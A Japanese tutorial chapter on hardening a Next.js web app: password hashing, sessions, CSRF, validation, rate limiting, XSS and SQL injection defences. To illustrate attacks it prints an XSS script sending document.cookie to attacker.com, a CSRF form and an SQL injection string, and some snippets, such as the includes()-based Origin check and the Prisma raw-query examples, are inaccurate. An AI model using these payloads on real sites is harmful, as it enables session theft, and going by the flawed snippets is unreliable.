# 第23章：セキュリティ

> **この章では、アプリケーションのセキュリティを強化する方法を学びます**

## 📚 この章で学ぶこと

- ✅ 認証のベストプラクティス
- ✅ APIのセキュリティ強化
- ✅ 環境変数の安全な管理
- ✅ CSRF攻撃への対策
- ✅ XSS攻撃への対策
- ✅ SQL インジェクションへの対策

## 💡 セキュリティの全体像

```
┌──────────────────────────────────────────────────┐
│     Webアプリケーションの主な脅威                │
└──────────────────────────────────────────────────┘

【認証・認可の脆弱性】
  ❌ 弱いパスワード
  ❌ セッションハイジャック
  ❌ 不適切な権限チェック
  ❌ トークンの漏洩

【インジェクション攻撃】
  ❌ SQLインジェクション
  ❌ XSS（クロスサイトスクリプティング）
  ❌ コマンドインジェクション

【その他の攻撃】
  ❌ CSRF（クロスサイトリクエストフォージェリ）
  ❌ 認証情報の平文保存
  ❌ 環境変数の漏洩
  ❌ レート制限なし


┌────────────────────────────────────┐
│  セキュリティ対策の階層              │
├────────────────────────────────────┤
│                                    │
│  【第1層】アプリケーション層        │
│  ├─ 入力検証                       │
│  ├─ 出力エスケープ                 │
│  └─ 権限チェック                   │
│                                    │
│  【第2層】認証層                   │
│  ├─ パスワードのハッシュ化         │
│  ├─ セッション管理                 │
│  └─ トークン検証                   │
│                                    │
│  【第3層】データベース層            │
│  ├─ パラメータ化クエリ             │
│  ├─ 最小権限の原則                 │
│  └─ データ暗号化                   │
│                                    │
│  【第4層】インフラ層                │
│  ├─ HTTPS通信                     │
│  ├─ ファイアウォール               │
│  └─ DDoS対策                      │
│                                    │
└────────────────────────────────────┘
```

---

## 23.1 認証のベストプラクティス

### パスワードのハッシュ化

**⚠️ 絶対にやってはいけないこと:**
```typescript
// ❌ 平文でパスワードを保存
await prisma.user.create({
  data: {
    email: 'user@example.com',
    password: 'password123', // 危険！
  },
});
```

**✅ 正しい方法（bcryptjsでハッシュ化）:**

```typescript
import bcrypt from 'bcryptjs';

// パスワードをハッシュ化して保存
const hashedPassword = await bcrypt.hash('password123', 10);

await prisma.user.create({
  data: {
    email: 'user@example.com',
    password: hashedPassword, // ハッシュ化されたパスワード
  },
});
```

**ハッシュ化の仕組み:**

```
┌──────────────────────────────────────────────────┐
│     パスワードハッシュ化の仕組み                  │
└──────────────────────────────────────────────────┘

【ハッシュ化とは？】
  一方向の暗号化。復号化できない。

  元のパスワード: "password123"
       ↓ bcrypt.hash()
  ハッシュ値: "$2a$10$XYZ...abc123"
       ↓ 
  データベースに保存


【ログイン時の検証】

  1. ユーザーがパスワードを入力
     → "password123"

  2. データベースからハッシュ値を取得
     → "$2a$10$XYZ...abc123"

  3. bcrypt.compare()で比較
     → true（一致） or false（不一致）


┌────────────────────────────────────┐
│  bcryptのラウンド数（コスト）       │
├────────────────────────────────────┤
│                                    │
│  bcrypt.hash(password, 10)        │
│                        ^^          │
│                        │           │
│                  ラウンド数         │
│                                    │
│  ラウンド数  処理時間  セキュリティ │
│  ─────────────────────────────────│
│      8         0.05秒      低      │
│     10         0.1秒       中      │
│     12         0.3秒       高      │
│     14         1.2秒       最高    │
│                                    │
│  推奨: 10〜12                      │
│  （セキュリティと速度のバランス）   │
│                                    │
└────────────────────────────────────┘
```

### セッション管理

**NextAuth.jsのセッション戦略:**

```typescript
// src/lib/auth.ts
import NextAuth from 'next-auth';
import CredentialsProvider from 'next-auth/providers/credentials';
import bcrypt from 'bcryptjs';
import { prisma } from './prisma';

export const { handlers, auth, signIn, signOut } = NextAuth({
  providers: [
    CredentialsProvider({
      credentials: {
        email: { label: 'Email', type: 'email' },
        password: { label: 'Password', type: 'password' },
      },
      async authorize(credentials) {
        if (!credentials?.email || !credentials?.password) {
          return null;
        }

        // ユーザーを取得
        const user = await prisma.user.findUnique({
          where: { email: credentials.email as string },
        });

        if (!user || !user.password) {
          return null;
        }

        // パスワードを検証
        const isValid = await bcrypt.compare(
          credentials.password as string,
          user.password
        );

        if (!isValid) {
          return null;
        }

        // ユーザー情報を返す（セッションに保存される）
        return {
          id: user.id,
          email: user.email,
          name: user.name,
          role: user.role,
        };
      },
    }),
  ],
  session: {
    strategy: 'jwt', // JWTトークンを使用
    maxAge: 30 * 24 * 60 * 60, // 30日間有効
  },
  callbacks: {
    async jwt({ token, user }) {
      // ユーザー情報をトークンに含める
      if (user) {
        token.id = user.id;
        token.role = user.role;
      }
      return token;
    },
    async session({ session, token }) {
      // トークンの情報をセッションに含める
      if (token) {
        session.user.id = token.id as string;
        session.user.role = token.role as string;
      }
      return session;
    },
  },
  pages: {
    signIn: '/login', // ログインページ
    error: '/login', // エラー時もログインページへ
  },
});
```

**セッションの仕組み:**

```
┌──────────────────────────────────────────────────┐
│     JWT (JSON Web Token) の仕組み               │
└──────────────────────────────────────────────────┘

【ログイン時】

  1. ユーザーがログイン
     → email + password を送信

  2. サーバーが認証
     → パスワードをbcrypt.compare()で検証

  3. JWTトークンを生成
     → ユーザーID、役割などを含む

  4. トークンをクッキーに保存
     → HttpOnly、Secure属性で保護


【リクエスト時】

  1. ブラウザが自動でクッキー送信
     → JWTトークンが含まれる

  2. サーバーがトークンを検証
     → 署名を確認

  3. セッション情報を取得
     → ユーザーID、役割など

  4. 権限チェック
     → 管理者のみアクセス可能など


┌────────────────────────────────────┐
│  JWTトークンの構造                  │
├────────────────────────────────────┤
│                                    │
│  Header.Payload.Signature          │
│                                    │
│  【Header】                        │
│  {                                 │
│    "alg": "HS256",                │
│    "typ": "JWT"                   │
│  }                                 │
│                                    │
│  【Payload】                       │
│  {                                 │
│    "id": "user123",               │
│    "email": "user@example.com",   │
│    "role": "member",              │
│    "exp": 1735689600              │
│  }                                 │
│                                    │
│  【Signature】                     │
│  HMACSHA256(                       │
│    base64(header) + "." +         │
│    base64(payload),               │
│    secret                         │
│  )                                 │
│                                    │
└────────────────────────────────────┘
```

### CSRF対策

**CSRF攻撃とは？**

```
┌──────────────────────────────────────────────────┐
│     CSRF (Cross-Site Request Forgery) 攻撃      │
└──────────────────────────────────────────────────┘

【攻撃シナリオ】

  1. ユーザーがサイトAにログイン
     → セッションクッキーが保存される

  2. ユーザーが悪意のあるサイトBを訪問
     → サイトBに罠のフォームがある

  3. サイトBからサイトAにリクエスト送信
     → ブラウザが自動でクッキーを送信

  4. サイトAはユーザーからのリクエストと誤認
     → 不正な操作が実行される


【攻撃例】

  悪意のあるサイトB:
  <form action="https://your-app.com/api/posts" method="POST">
    <input type="hidden" name="title" value="スパム投稿">
    <input type="hidden" name="content" value="...">
  </form>
  <script>
    document.forms[0].submit(); // 自動送信
  </script>

  → ユーザーの知らないうちに投稿が作成される！
```

**NextAuth.jsによるCSRF対策:**

NextAuth.jsは自動的にCSRF対策を実施します。

```typescript
// NextAuth.jsが自動で以下を実施:
// 1. CSRFトークンの生成
// 2. クッキーに保存
// 3. フォーム送信時にトークンを検証
// 4. トークンが一致しない場合はリクエストを拒否
```

**手動でのCSRF対策（API Route）:**

```typescript
// src/middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  // POSTリクエストの場合、Originヘッダーをチェック
  if (request.method === 'POST') {
    const origin = request.headers.get('origin');
    const host = request.headers.get('host');

    // OriginとHostが一致するかチェック
    if (origin && !origin.includes(host || '')) {
      return new NextResponse('CSRF detected', { status: 403 });
    }
  }

  return NextResponse.next();
}

export const config = {
  matcher: '/api/:path*', // APIルートのみ適用
};
```

---

## 23.2 APIのセキュリティ

### 権限チェック

**すべてのAPI Routeで認証・権限をチェックします。**

**❌ 権限チェックなし（危険）:**
```typescript
// src/app/api/posts/route.ts
export async function POST(request: NextRequest) {
  const body = await request.json();

  // 誰でも投稿を作成できる（危険！）
  const post = await prisma.post.create({
    data: body,
  });

  return NextResponse.json(post);
}
```

**✅ 権限チェックあり（安全）:**

```typescript
// src/app/api/posts/route.ts
import { auth } from '@/lib/auth';
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  // 1. セッションを取得
  const session = await auth();

  // 2. ログインチェック
  if (!session?.user) {
    return NextResponse.json(
      { error: '認証が必要です' },
      { status: 401 } // Unauthorized
    );
  }

  // 3. 権限チェック（管理者のみ）
  if (session.user.role !== 'admin') {
    return NextResponse.json(
      { error: '権限がありません' },
      { status: 403 } // Forbidden
    );
  }

  // 4. 投稿を作成
  const body = await request.json();
  const post = await prisma.post.create({
    data: {
      ...body,
      authorId: session.user.id, // ログインユーザーのIDを使用
    },
  });

  return NextResponse.json(post);
}
```

**権限チェックの流れ:**

```
┌──────────────────────────────────────┐
│  API Route の権限チェックフロー      │
├──────────────────────────────────────┤
│                                      │
│  1. リクエストを受信                 │
│     ↓                                │
│  2. セッションを取得                 │
│     session = await auth()          │
│     ↓                                │
│  3. ログインチェック                 │
│     if (!session?.user)             │
│       → 401 Unauthorized            │
│     ↓                                │
│  4. 権限チェック                     │
│     if (role !== 'admin')           │
│       → 403 Forbidden               │
│     ↓                                │
│  5. 処理を実行                       │
│     データベース操作など             │
│     ↓                                │
│  6. レスポンスを返す                 │
│     200 OK + データ                 │
│                                      │
└──────────────────────────────────────┘
```

### 入力検証（バリデーション）

**ユーザーからの入力は必ず検証します。**

**Zodを使った入力検証:**

```bash
# Zodのインストール
npm install zod
```

**検証スキーマの定義:**

```typescript
// src/lib/validations/post.ts
import { z } from 'zod';

// 投稿作成時のスキーマ
export const createPostSchema = z.object({
  title: z
    .string()
    .min(1, 'タイトルは必須です')
    .max(200, 'タイトルは200文字以内で入力してください'),
  content: z
    .string()
    .min(1, '内容は必須です')
    .max(10000, '内容は10000文字以内で入力してください'),
  imageUrl: z
    .string()
    .url('有効なURLを入力してください')
    .optional()
    .nullable(),
  youtubeUrls: z
    .array(z.string().url('有効なURLを入力してください'))
    .max(5, 'YouTube URLは5つまで登録できます')
    .optional()
    .nullable(),
});

// TypeScriptの型を自動生成
export type CreatePostInput = z.infer<typeof createPostSchema>;
```

**API Routeで検証:**

```typescript
// src/app/api/posts/route.ts
import { createPostSchema } from '@/lib/validations/post';

export async function POST(request: NextRequest) {
  const session = await auth();

  if (!session?.user || session.user.role !== 'admin') {
    return NextResponse.json({ error: '権限がありません' }, { status: 403 });
  }

  try {
    const body = await request.json();

    // 入力を検証
    const validatedData = createPostSchema.parse(body);

    // 検証が成功した場合のみ、データベース操作
    const post = await prisma.post.create({
      data: {
        ...validatedData,
        authorId: session.user.id,
      },
    });

    return NextResponse.json(post);
  } catch (error) {
    // Zodのバリデーションエラー
    if (error instanceof z.ZodError) {
      return NextResponse.json(
        { error: '入力が不正です', details: error.errors },
        { status: 400 }
      );
    }

    // その他のエラー
    return NextResponse.json(
      { error: '投稿の作成に失敗しました' },
      { status: 500 }
    );
  }
}
```

**バリデーションの効果:**

```
┌──────────────────────────────────────┐
│  バリデーションの効果                │
├──────────────────────────────────────┤
│                                      │
│  【バリデーションなし】              │
│  ❌ 空のタイトルで投稿作成           │
│  ❌ 100万文字の投稿でDBを圧迫        │
│  ❌ 不正なURLでエラー                │
│  ❌ XSS攻撃のリスク                  │
│                                      │
│  【バリデーションあり】              │
│  ✅ 入力エラーを事前に検出           │
│  ✅ データベースの整合性を保証       │
│  ✅ わかりやすいエラーメッセージ     │
│  ✅ TypeScriptの型安全性             │
│                                      │
└──────────────────────────────────────┘
```

### レート制限

**API呼び出しの回数を制限して、DoS攻撃を防ぎます。**

```bash
# レート制限ライブラリのインストール
npm install @upstash/ratelimit @upstash/redis
```

**Upstash Redisのセットアップ:**

1. https://upstash.com にアクセス
2. アカウント作成（無料プランでOK）
3. Redisデータベースを作成
4. 接続情報を取得

**環境変数に追加:**
```env
# .env.local
UPSTASH_REDIS_REST_URL="https://xxx.upstash.io"
UPSTASH_REDIS_REST_TOKEN="AX..."
```

**レート制限の実装:**

```typescript
// src/lib/rate-limit.ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

// Redisクライアントを作成
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL!,
  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
});

// レート制限を作成
// 10リクエスト / 10秒
export const ratelimit = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(10, '10 s'),
  analytics: true,
});

// より厳しい制限（ログイン用）
// 5リクエスト / 60秒
export const loginRatelimit = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(5, '60 s'),
  analytics: true,
});
```

**API Routeで使用:**

```typescript
// src/app/api/posts/route.ts
import { ratelimit } from '@/lib/rate-limit';

export async function POST(request: NextRequest) {
  // IPアドレスを取得
  const ip = request.headers.get('x-forwarded-for') ?? 'unknown';

  // レート制限をチェック
  const { success, limit, remaining, reset } = await ratelimit.limit(ip);

  if (!success) {
    return NextResponse.json(
      {
        error: 'リクエストが多すぎます。しばらくしてから再度お試しください。',
      },
      {
        status: 429, // Too Many Requests
        headers: {
          'X-RateLimit-Limit': limit.toString(),
          'X-RateLimit-Remaining': remaining.toString(),
          'X-RateLimit-Reset': reset.toString(),
        },
      }
    );
  }

  // 以降、通常の処理
  // ...
}
```

**レート制限の仕組み:**

```
┌──────────────────────────────────────────────────┐
│     レート制限の仕組み                            │
└──────────────────────────────────────────────────┘

【Sliding Window アルゴリズム】

  時間軸: ─────────────────────────────→
         0s    10s    20s    30s    40s

  ウィンドウ1: [────────]
               10リクエスト/10秒

  ウィンドウ2:        [────────]
                      10リクエスト/10秒


【リクエストのカウント】

  0秒: リクエスト1 ✓
  1秒: リクエスト2 ✓
  2秒: リクエスト3 ✓
  ...
  5秒: リクエスト10 ✓
  6秒: リクエスト11 ❌ (制限に達した)

  → 10秒後に再試行可能


┌────────────────────────────────────┐
│  レート制限の設定例                 │
├────────────────────────────────────┤
│                                    │
│  【一般的なAPI】                   │
│  10リクエスト / 10秒               │
│                                    │
│  【ログインAPI】                   │
│  5リクエスト / 60秒                │
│  （ブルートフォース攻撃対策）       │
│                                    │
│  【画像アップロード】               │
│  3リクエスト / 60秒                │
│  （サーバー負荷対策）               │
│                                    │
└────────────────────────────────────┘
```

---

## 23.3 環境変数の管理

### 環境変数の種類

```
┌──────────────────────────────────────┐
│  環境変数の分類                      │
├──────────────────────────────────────┤
│                                      │
│  【秘密情報】                        │
│  ├─ DATABASE_URL                    │
│  ├─ AUTH_SECRET                     │
│  ├─ GOOGLE_CLIENT_SECRET            │
│  └─ UPSTASH_REDIS_REST_TOKEN        │
│     → サーバーサイドのみで使用       │
│     → ブラウザに公開してはいけない   │
│                                      │
│  【公開情報】                        │
│  ├─ NEXT_PUBLIC_SUPABASE_URL        │
│  ├─ NEXT_PUBLIC_SUPABASE_ANON_KEY   │
│  └─ NEXT_PUBLIC_APP_URL             │
│     → ブラウザでも使用可能           │
│     → NEXT_PUBLIC_プレフィックス    │
│                                      │
└──────────────────────────────────────┘
```

### .gitignoreの設定

**⚠️ 環境変数ファイルをGitにコミットしてはいけません！**

`.gitignore` を確認：

```bash
# .gitignore
# 環境変数ファイル
.env
.env.local
.env.development
.env.production
.env*.local

# データベースファイル
*.db
*.db-journal
prisma/dev.db

# ビルド成果物
.next/
out/
build/
dist/

# 依存関係
node_modules/

# ログ
npm-debug.log*
yarn-debug.log*
yarn-error.log*
```

### 環境変数のテンプレート

`.env.example` を用意して、必要な環境変数を明示します。

```env
# .env.example

# データベース
DATABASE_URL="file:./dev.db"

# NextAuth.js
AUTH_URL="http://localhost:3000"
AUTH_SECRET="your-secret-here"
AUTH_TRUST_HOST="true"
NEXTAUTH_URL="http://localhost:3000"
NEXTAUTH_SECRET="your-secret-here"

# Google OAuth
GOOGLE_CLIENT_ID="your-google-client-id"
GOOGLE_CLIENT_SECRET="your-google-client-secret"

# Supabase
NEXT_PUBLIC_SUPABASE_URL="your-supabase-url"
NEXT_PUBLIC_SUPABASE_ANON_KEY="your-supabase-anon-key"

# Upstash Redis（レート制限用）
UPSTASH_REDIS_REST_URL="your-upstash-url"
UPSTASH_REDIS_REST_TOKEN="your-upstash-token"
```

### 環境変数の検証

アプリケーション起動時に、必要な環境変数が設定されているか検証します。

**環境変数検証スクリプト:**

```typescript
// src/lib/env.ts
import { z } from 'zod';

// 環境変数のスキーマ
const envSchema = z.object({
  // データベース
  DATABASE_URL: z.string().min(1, 'DATABASE_URLは必須です'),

  // NextAuth.js
  AUTH_URL: z.string().url('AUTH_URLは有効なURLである必要があります'),
  AUTH_SECRET: z.string().min(32, 'AUTH_SECRETは32文字以上である必要があります'),
  AUTH_TRUST_HOST: z.string(),
  NEXTAUTH_URL: z.string().url('NEXTAUTH_URLは有効なURLである必要があります'),
  NEXTAUTH_SECRET: z.string().min(32, 'NEXTAUTH_SECRETは32文字以上である必要があります'),

  // Google OAuth
  GOOGLE_CLIENT_ID: z.string().min(1, 'GOOGLE_CLIENT_IDは必須です'),
  GOOGLE_CLIENT_SECRET: z.string().min(1, 'GOOGLE_CLIENT_SECRETは必須です'),

  // Supabase
  NEXT_PUBLIC_SUPABASE_URL: z.string().url('NEXT_PUBLIC_SUPABASE_URLは有効なURLである必要があります'),
  NEXT_PUBLIC_SUPABASE_ANON_KEY: z.string().min(1, 'NEXT_PUBLIC_SUPABASE_ANON_KEYは必須です'),

  // Upstash Redis（オプション）
  UPSTASH_REDIS_REST_URL: z.string().url().optional(),
  UPSTASH_REDIS_REST_TOKEN: z.string().optional(),
});

// 環境変数を検証
try {
  envSchema.parse(process.env);
} catch (error) {
  if (error instanceof z.ZodError) {
    console.error('❌ 環境変数の検証に失敗しました:');
    error.errors.forEach((err) => {
      console.error(`  - ${err.path.join('.')}: ${err.message}`);
    });
    process.exit(1);
  }
}

// 型安全な環境変数のエクスポート
export const env = {
  DATABASE_URL: process.env.DATABASE_URL!,
  AUTH_URL: process.env.AUTH_URL!,
  AUTH_SECRET: process.env.AUTH_SECRET!,
  // ...
};
```

**使用方法:**

```typescript
// src/lib/prisma.ts
import { env } from './env'; // 検証済みの環境変数

const prisma = new PrismaClient({
  datasources: {
    db: {
      url: env.DATABASE_URL, // 型安全
    },
  },
});
```

---

## 23.4 XSS対策

### XSS（クロスサイトスクリプティング）とは？

```
┌──────────────────────────────────────────────────┐
│     XSS攻撃の仕組み                              │
└──────────────────────────────────────────────────┘

【攻撃シナリオ】

  1. 攻撃者が悪意のあるスクリプトを投稿
     → コメント欄に "<script>alert('XSS')</script>"

  2. サーバーがそのままデータベースに保存

  3. 他のユーザーがそのページを開く

  4. ブラウザがスクリプトを実行
     → 攻撃者のコードが実行される！


【攻撃例】

  投稿内容:
  <script>
    // ユーザーのクッキーを盗む
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: document.cookie
    });
  </script>

  → セッション乗っ取りの危険！
```

### Reactによる自動エスケープ

**Reactは自動的にXSSを防ぎます:**

```typescript
// ✅ 安全: Reactが自動でエスケープ
export default function Comment({ text }: { text: string }) {
  return (
    <div>
      {text} {/* 自動エスケープされる */}
    </div>
  );
}

// 例: text = "<script>alert('XSS')</script>"
// 実際の出力: &lt;script&gt;alert('XSS')&lt;/script&gt;
// ブラウザ表示: <script>alert('XSS')</script> （文字列として表示）
```

**⚠️ dangerouslySetInnerHTMLは危険:**

```typescript
// ❌ 危険: エスケープされない
export default function Comment({ html }: { html: string }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: html }} />
  );
}

// 例: html = "<script>alert('XSS')</script>"
// 実際の出力: <script>alert('XSS')</script>
// ブラウザ表示: スクリプトが実行される！
```

### Markdownのサニタイズ

Markdownを表示する場合は、サニタイズが必要です。

```bash
# DOMPurifyのインストール
npm install dompurify
npm install --save-dev @types/dompurify
```

**Markdownコンポーネントの安全な実装:**

```typescript
// src/components/MarkdownContent.tsx
'use client';

import { marked } from 'marked';
import DOMPurify from 'dompurify';

interface MarkdownContentProps {
  content: string;
}

export default function MarkdownContent({ content }: MarkdownContentProps) {
  // 1. MarkdownをHTMLに変換
  const rawHtml = marked(content);

  // 2. HTMLをサニタイズ（危険なタグ・属性を削除）
  const sanitizedHtml = DOMPurify.sanitize(rawHtml, {
    // 許可するタグ
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'u', 's', 'code', 'pre',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li',
      'blockquote',
      'a', 'img',
    ],
    // 許可する属性
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title'],
    // 危険なプロトコルを削除
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  });

  return (
    <div
      className="prose prose-lg max-w-none"
      dangerouslySetInnerHTML={{ __html: sanitizedHtml }}
    />
  );
}
```

**サニタイズの効果:**

```
┌──────────────────────────────────────┐
│  DOMPurify によるサニタイズ          │
├──────────────────────────────────────┤
│                                      │
│  【入力】                            │
│  <p>普通のテキスト</p>              │
│  <script>alert('XSS')</script>      │
│  <img src="x" onerror="alert('X')">│
│  <a href="javascript:alert('X')">  │
│                                      │
│  【サニタイズ後】                    │
│  <p>普通のテキスト</p>              │
│  （scriptタグは削除）                │
│  <img src="x">                      │
│  <a>（javascriptプロトコルは削除）   │
│                                      │
└──────────────────────────────────────┘
```

---

## 23.5 SQLインジェクション対策

### SQLインジェクションとは？

```
┌──────────────────────────────────────────────────┐
│     SQLインジェクション攻撃                       │
└──────────────────────────────────────────────────┘

【攻撃シナリオ】

  悪意のあるSQL文を入力に混入させる

  例: ログインフォーム
    Email: admin@example.com
    Password: ' OR '1'='1

  生SQL（危険）:
    SELECT * FROM users
    WHERE email = 'admin@example.com'
      AND password = '' OR '1'='1'
                        ^^^^^^^^^^^^^
                        常にtrue！

  → 全ユーザーの情報が取得される！
```

### Prismaによる自動対策

**Prismaは自動的にSQLインジェクションを防ぎます:**

```typescript
// ✅ 安全: Prismaが自動でエスケープ
const user = await prisma.user.findUnique({
  where: {
    email: userInput, // どんな入力でも安全
  },
});

// Prismaが生成するSQL:
// SELECT * FROM users WHERE email = ? 
// プレースホルダー（?）を使用してエスケープ
```

**⚠️ 生SQLは危険（使わないでください）:**

```typescript
// ❌ 危険: SQLインジェクションのリスク
const users = await prisma.$queryRaw`
  SELECT * FROM users WHERE email = '${userInput}'
`;
// userInput = "' OR '1'='1" の場合、全ユーザーが取得される
```

**正しい生SQLの使い方:**

```typescript
// ✅ 安全: パラメータ化クエリ
import { Prisma } from '@prisma/client';

const users = await prisma.$queryRaw`
  SELECT * FROM users WHERE email = ${Prisma.sql`${userInput}`}
`;
// Prismaが自動でエスケープ
```

---

## 23.6 セキュリティチェックリスト

アプリケーションのセキュリティを確認しましょう。

### 認証・認可

- [ ] パスワードをbcryptでハッシュ化している
- [ ] セッションをJWTで管理している
- [ ] セッションの有効期限を設定している
- [ ] すべてのAPI Routeで認証チェックをしている
- [ ] 権限チェック（admin/member）を実装している

### 入力検証

- [ ] Zodで入力を検証している
- [ ] 文字数制限を設定している
- [ ] URLの形式を検証している
- [ ] バリデーションエラーを適切に処理している

### XSS対策

- [ ] Reactの自動エスケープを利用している
- [ ] dangerouslySetInnerHTMLを使用していない（または適切にサニタイズ）
- [ ] MarkdownをDOMPurifyでサニタイズしている
- [ ] ユーザー入力をそのままHTML化していない

### CSRF対策

- [ ] NextAuth.jsのCSRF対策が有効
- [ ] POST APIでOriginヘッダーをチェックしている
- [ ] クッキーにSameSite属性を設定している

### SQLインジェクション対策

- [ ] Prismaを使用している（生SQLを使っていない）
- [ ] ユーザー入力をそのままSQLに埋め込んでいない

### 環境変数

- [ ] .env.localを.gitignoreに含めている
- [ ] 秘密情報をハードコードしていない
- [ ] 環境変数の検証を実装している
- [ ] 本番環境の環境変数を適切に設定している

### その他

- [ ] レート制限を実装している
- [ ] HTTPSで通信している（本番環境）
- [ ] エラーメッセージに機密情報を含めていない
- [ ] ログに機密情報を出力していない

---

## まとめ

この章では、アプリケーションのセキュリティ対策を学びました。

### 🎓 この章で学んだこと

#### 認証のベストプラクティス
- ✅ bcryptによるパスワードハッシュ化
- ✅ JWTによるセッション管理
- ✅ NextAuth.jsによる認証の実装
- ✅ CSRF対策

#### APIのセキュリティ
- ✅ 認証・権限チェック
- ✅ Zodによる入力検証
- ✅ レート制限の実装
- ✅ エラーハンドリング

#### 攻撃への対策
- ✅ XSS対策（自動エスケープ、サニタイズ）
- ✅ SQLインジェクション対策（Prisma）
- ✅ CSRF対策（NextAuth.js）

#### 環境変数の管理
- ✅ .gitignoreの設定
- ✅ 環境変数の検証
- ✅ 秘密情報の保護

### 💡 重要なポイント

#### セキュリティの原則

```
1. 信頼しない（Trust No One）
   → すべての入力を検証する

2. 最小権限の原則（Principle of Least Privilege）
   → 必要最小限の権限のみ付与

3. 多層防御（Defense in Depth）
   → 複数のセキュリティ層を実装

4. 失敗時は安全側に（Fail Secure）
   → エラー時は操作を拒否
```

#### チェックの順序

```typescript
// API Routeのセキュリティチェック順序

1. レート制限チェック
   → DoS攻撃を防ぐ

2. 認証チェック
   → ログインしているか

3. 権限チェック
   → 操作権限があるか

4. 入力検証
   → データが正しい形式か

5. 処理実行
   → データベース操作など
```

### 🚀 次のステップ

これで「デプロイと運用編」が完了しました！次は応用編に進みます：

- **Chapter 24**: 機能の追加とカスタマイズ
- **Chapter 25**: トラブルシューティング

セキュリティを確保したアプリケーションに、さらに機能を追加していきましょう！

---

[← 前の章：第22章 パフォーマンス最適化](22-パフォーマンス最適化.md) | [目次に戻る](00-目次.md) | [次の章へ：第24章 機能の追加とカスタマイズ →](24-機能の追加とカスタマイズ.md)
